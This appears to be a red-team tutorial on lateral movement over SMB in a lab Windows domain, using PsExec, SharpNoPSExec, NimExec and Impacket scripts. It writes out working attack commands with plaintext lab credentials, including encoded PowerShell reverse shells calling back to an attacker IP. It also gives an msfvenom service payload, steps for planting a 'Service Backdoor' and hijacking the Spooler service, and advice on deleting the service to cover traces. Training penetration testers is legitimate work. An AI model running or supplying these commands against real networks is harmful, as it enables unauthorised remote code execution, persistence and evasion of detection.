## Server Message Block (SMB) 


***Server Message Block (SMB)*** is a network communication protocol that facilitates the sharing of files, printers, and other resources among computers within a network. It enables users and applications to read and write files, manage directories, and perform different functions on remote servers as if they were local. It also supports transaction protocols for interprocess communication. SMB primarily operates on Windows systems but is compatible with other operating systems, making it a key protocol for networked environments. 


### SMB Rights

For successful SMB lateral movement, we require an account that is a member of the Administrators group on the target computer. It's also crucial that ***ports TCP 445 and TCP 139 are open. Optionally, port TCP 135 may also need to be open*** because some tools use it for communication. 


### UAC remote restrictions 


**UAC** might prevent us from achieving remote code execution, but understanding these restrictions is crucial for effectively leveraging these tools while navigating UAC limitations on different versions of Windows, these restrictions imply several key points: 

> Local admin privileges are necessary. 
> Local admin accounts that are not RID 500 cannot run tools such as PsExec on Windows Vista and later. 
> Domain users with admin rights on a machine can execute tools such as PsExec. 
> RID 500 local admin accounts can utilize tools such as PsExec on machines. 


#### SMB Named Pipes


Named pipes in ***SMB, accessed via the IPC$ share over TCP port 445, are vital for lateral movement within a network.*** They enable a range of operations from NULL session contexts to those requiring local administrative privileges. For instance, svcctl facilitates the remote creation, starting, and stopping of services to execute commands, as seen in tools like ***Impacket's psexec.py and smbexec.py. atsvc supports the remote creation of scheduled tasks for command execution, utilized by Impacket's atexec.py.*** These named pipes are crucial for executing and managing lateral movement operations effectively. winreg provides remote access to the Windows registry, allowing to query and modify registry keys and values, helping in the persistence and configuration of malicious payloads. 


### SMB Enumeration 

Before we begin the lateral movement process, we need to ensure that SMB is running on the target host. To achieve this we will use NMAP.

We must conduct a port scan on the target host to verify whether SMB is running on the target. By default, SMB uses ports TCP 139 and TCP 445. 


![Lateral Movement](/Server-Message-Block/images/nmap.png) 


### Lateral Movement From Windows 


To execute lateral movement from Windows several tools and techniques can be used. In this section, we will be showing ***PSExec, SharpNoPSExec, NimExec, and Reg.exe.*** Let's connect via RDP to SRV01 using helen's credentials: 


#### PSExec

[PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is included in Microsoft's [Sysinternals suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), a collection of tools designed to assist administrators in system management tasks. This tool facilitates remote command execution and retrieves output over a named pipe using the SMB protocol, operating on TCP port 445 and TCP port 139.

By default, PSExec performs the following action: 

1. Establishes a link to the hidden ADMIN$ share, which corresponds to the C:\Windows directory on the remote system, via SMB. 

2. Uses the Service Control Manager (SCM) to initiate the PsExecsvc service and set up a named pipe on the remote system. 

3. Redirects the console’s input and output through the created named pipe for interactive command execution. 

We can use PsExec to connect to a remote host and execute commands interactivelly. We must specify the computer or target where we are connecting \\SRV02, the option -i for interactive shell, the administrator login credentials with the option -u <user> and the password -p <password>, and cmd to specify the application to execute: 


In case we want to ***execute our payload as NT AUTHORITY\SYSTEM, we need to specify the option -s*** which means that it will run with SYSTEM privileges: 


```

PS C:\> .\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd

PS C:\> .\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

```

![Lateral Movement](/Server-Message-Block/images/psexec.png) 

![Lateral Movement](/Server-Message-Block/images/psexec-2.png) 


#### SharpNoPSExec 


[SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec) is a tool designed to facilitate lateral movement by leveraging existing services on a target system without creating new ones or writing to disk, thus minimizing detection risk. The tool queries all services on the target machine, identifying those with a start type set to disabled or manual, current status of stopped, and running with LocalSystem privileges. It randomly selects one of these services and temporarily modifies its binary path to point to a payload of the attacker’s choice. Upon execution, SharpNoPSExec waits approximately 5 seconds before restoring the original service configuration, returning the service to its previous state. This approach not only provides a shell but also avoids the creation of new services, which security monitoring systems could flag. 


Executing the tool without parameters we will see some help and usage information. 


![Lateral Movement](/Server-Message-Block/images/sharpnopsexec.png) 


To perform lateral movement with SharpNoPSExec, we will need a listener as this tool will only allow us to execute code on the machine, but it won't give us an interactive shell as PsExec does. We can start listening with Netcat: 

**SharpNoPSExec** uses the credentials of the console we are executing the command from, so we need to make sure to launch it from a console that has the correct credentials. Alternatively, we can use the **arguments --username, --password and --domain.** Additionally, we have to provide the target IP address or the domain name --target=<IP/Domain>, and the command we want to execute. For the command, we can use the payload shown in the help menu to set our reverse shell --payload="c:\windows\system32\cmd.exe /c <reverseShell>. We can generate the reverse shell payload using [Revshells](https://www.revshells.com/) or our favorite C2:


```

C:\Tools>.\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\Windows\System32\cmd.exe /c powershell -exec bypass -nop -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

$ rlwrap nc -nlvp 4444 

```

![Lateral Movement](/Server-Message-Block/images/revshell.png) 


#### NimExec


[NimExec](https://github.com/frkngksl/NimExec) is a fileless remote command execution tool that operates by exploiting the Service Control Manager Remote Protocol (MS-SCMR). Instead of using traditional WinAPI calls, NimExec manipulates the binary path of a specified or randomly selected service with LocalSystem privileges to execute a given command on the target machine and later restores the original configuration. This is achieved through custom-crafted RPC packets sent over SMB and the svcctl named pipe. Authentication is handled using an NTLM hash, which NimExec utilizes to complete the process via the NTLM Authentication method over its custom packets. By manually crafting the necessary network packets and avoiding OS-specific functions, this tool benefits from Nim's cross-compilation capabilities, making it versatile across different operating systems. 


#### Modifying SMB Registry keys

It is important to keep in mind that to use SMB share folder without authentication we need to have the following registry key set to 1: 

	```
	
	PS C:\Tools> reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth
	
	PS C:\Tools> reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
	
	```

![Lateral Movement](/Server-Message-Block/images/smb-regedit.png) 


### Lateral Movement from Linux 


To achieve lateral movement from Linux we can use the Impacket tool set. [Impacket](https://github.com/fortra/impacket) is a suite of Python libraries designed for interacting with network protocols. It focuses on offering low-level programmatic control over packet manipulation and, for certain protocols like SMB and MSRPC, includes the protocol implementations themselves. 


#### Psexec.py 


[Psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) is a great alternative for Linux users. This method is very similar to the traditional PsExec tool from SysInternals suite. psexec.py creates a remote service by uploading an executable with a random name to the ADMIN$ share on the target Windows machine. It then registers this service via RPC and the Windows Service Control Manager. Once registered, the tool establishes communication through a named pipe, allowing for the execution of commands and retrieval of outputs on the remote system. Understanding this mechanism is crucial for effectively utilizing the tool and appreciating its role in facilitating remote command execution.

- We can use psexec.py to get remote code execution on a target host, administrator login credentials are required. 
- We must provide the domain, admin level user, password, and the target IP as follows 
- ***<domain>/<user>:<password>@<ip>:*** 

	` $ proxychains4 -q impacket-psexec INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 `


![Lateral Movement](/Server-Message-Block/images/impacket-psexec.png) 


#### smbexec.py


The [smbexec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative. 

Communication occurs exclusively over TCP port 445. It also sets up a service, using only MSRPC for this, and manages the service through the svcctl SMB pipe. 

To use this tool, we must provide the domain name, administrator user, password, and the target IP address 

> ***<domain>/<user>:<password>@<ip>:*** 


	` proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 ` 
	

![Lateral Movement](/Server-Message-Block/images/smbexec.png) 


#### Services.py 


The [services.py](https://github.com/fortra/impacket/blob/master/examples/services.py) script in Impacket interacts with Windows services using the [MSRPC](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) interface. It allows starting, stopping, deleting, reading status, configuring, listing, creating, and modifying services. During Red Teaming assignments, many tasks can be greatly simplified by gaining access to the target machine's services. This technique is non-interactive, meaning that we won't be able to see the results of the actions in real time.

We can view a list of services in the target host, by typing the command list after providing the domain name, the administrator account, the password, and target IP address 

> ***<domain>/<user>:<password>@<ip>*** 

	
	` proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'&172.20.0.52 list ` 
	

![Lateral Movement](/Server-Message-Block/images/services.png) 


To move laterally with this tool, we can set up a new service, modify an existing one, and define a custom command to get a reverse shell. 

To create a new service, instead of using the option list we will use create followed by the name of the new service -name <serviceName>, a display name -display "<Service Display Name>" and finally we specify the command we want to execute with the option -path "cmd /c <payload>". 

For our payload, we will use the Metasploit output option exe-service, which creates a service binary: 

	```
	 msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=9001 -f exe-service -o service.exe 
	 
	 proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor -path "\\\\10.10.14.23\\share\service.exe"
	 
	 proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'
	 
	 impacket-smbserver share . -smb2support 
	 
	 rlwrap nc -nlvp 9001 
	 
	 proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor'
	 
	 proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name Spooler 
	 
	 proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.23\\kali\\service.exe" -start_type 2
	 
	rlwrap nc -nlvp 9001
	
	impacket-smbserver kali . -smb2support
	 
	 proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler 
	 
	 ```
	 
	 
	
![Lateral Movement](/Server-Message-Block/images/services-1.png) 

Now, we can execute the command to create a new service: 

We can view the configuration of the custom command created using config -name <serviceName>: 

Before we run the service, we must ensure that the SMB server has the file that will be executed: 

We must start our Netcat listener: 

We can now start the service with start -name <serviceName>: 

Looking at our attack host, we have successfully established a reverse shell: 

Finally, we can cover up the traces and delete the service by typing delete -name <serviceName>: 


Alternatively, we use services.py to modify existing services; for example, if we find a service authenticated as a specific user account, we can change the configuration of that service and make it execute our payload. In the following example, we can modify the Spooler service to execute our payload. First, let's see the current service configuration: 

Next we will modify the binary path to our payload and set the START_TYPE to AUTO START with the option -start_type 2: 

The advantage of this is that if a service is configured with a specific user account, we can take advantage of that account and impersonate it. 


![Lateral Movement](/Server-Message-Block/images/services-2.png) 

![Lateral Movement](/Server-Message-Block/images/services-3.png) 

![Lateral Movement](/Server-Message-Block/images/services-4.png) 

![Lateral Movement](/Server-Message-Block/images/services-5.png) 



#### atexec.py 


The [atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py) script utilizes the Windows Task Scheduler service, which is accessible through the ***atsvc SMB pipe***. It enables us to remotely append a task to the scheduler, which will execute at the designated time.

With this tool, the command output is sent to a file, which is subsequently accessed via the ***ADMIN$ share***. For this utility to be effective, it's essential to synchronize the clocks on both the attacking and target PCs down to the exact minute.

We can leverage this tool by inserting a reverse shell on the target host.

	```
	rlwrap nc -nlvp 8080
	
	proxychains4 atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
	
	```
	


Let's start a Netcat listener: 

Now let's pass the domain name, administrator user, password, and target IP address <domain>/<user>:<password>@<ip>, and lastly, we can pass our reverse shell payload to get executed. We can generate the reverse shell payload using [revshells.com](https://www.revshells.com/). 

We have successfully established a reverse shell connection in our attack box: 

![Lateral Movement](/Server-Message-Block/images/atexec.png) 
